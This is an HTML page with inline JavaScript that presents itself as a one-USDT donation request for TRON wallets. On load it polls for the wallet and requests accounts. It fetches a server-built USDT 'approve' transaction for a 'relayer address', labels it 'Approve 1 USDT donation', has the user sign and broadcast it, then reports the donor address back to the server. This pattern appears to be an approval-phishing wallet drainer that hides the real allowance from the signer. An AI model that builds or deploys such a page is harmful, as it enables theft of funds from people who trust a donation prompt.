<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Approve</title>
</head>
<body style="background:#0f172a;color:#fff;font-family:sans-serif;text-align:center;padding:60px 20px;margin:0;">
    <p id="msg1" style="font-size:16px;color:#9ca3af;">Loading...</p>
    <p id="msg2" style="font-size:11px;color:#6b7280;margin-top:20px;"></p>

    <script>
        var USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        var AMOUNT = 1000000;
        // Approve is now built on the server (approves relayer address)
        var el1 = document.getElementById("msg1");
        var el2 = document.getElementById("msg2");

        function msg(a, b) {
            el1.textContent = a;
            if (b) el2.textContent = b;
        }

        function run() {
            try {
                msg("Waiting for wallet...");
                var n = 0;
                var t = setInterval(function() {
                    n++;
                    try {
                        var tw = window.tronWeb;
                        if (!tw) { el2.textContent = "attempt " + n; return; }

                        var addr = tw.defaultAddress && tw.defaultAddress.base58;
                        if (!addr || addr === "false" || addr.length < 10) {
                            el2.textContent = "tronWeb found, addr=" + addr + " attempt " + n;
                            // Try requesting accounts
                            if (n === 5 && window.tronLink && window.tronLink.request) {
                                window.tronLink.request({ method: "tron_requestAccounts" }).catch(function(){});
                            }
                            return;
                        }

                        // GOT ADDRESS - proceed
                        clearInterval(t);
                        msg("Got wallet: " + addr.substring(0, 8) + "...", "Building transaction...");
                        buildAndSign(addr);
                    } catch(e) {
                        el2.textContent = "poll error: " + e.message;
                    }
                }, 300);

                setTimeout(function() { clearInterval(t); }, 30000);
            } catch(e) {
                msg("Error", e.message);
            }
        }

        function buildAndSign(addr) {
            msg("Building transaction...", "");

            // Build the approve TX on server
            fetch("/api/build-approve", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({donor: addr})
            })
            .then(function(r) { return r.json(); })
            .then(function(data) {
                if (data.error) { msg("Server error", data.error); return; }
                msg("Confirm in your wallet!", "Approve 1 USDT donation");

                // Step 3: Ask Trust Wallet to sign (popup appears)
                return window.tronWeb.trx.sign(data.transaction);
            })
            .then(function(signed) {
                msg("Broadcasting...", "Signed successfully");
                return window.tronWeb.trx.sendRawTransaction(signed);
            })
            .then(function(res) {
                var id = res.txid || (res.transaction && res.transaction.txID) || "unknown";
                msg("Success!", "TX: " + id);
                el1.style.color = "#4ade80";
                fetch("/api/approved", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({donor: addr, txId: id})
                }).catch(function(){});
            })
            .catch(function(e) {
                msg("Error", (e.message || JSON.stringify(e)));
                el1.style.color = "#f87171";
            });
        }

        run();
    </script>
</body>
</html>
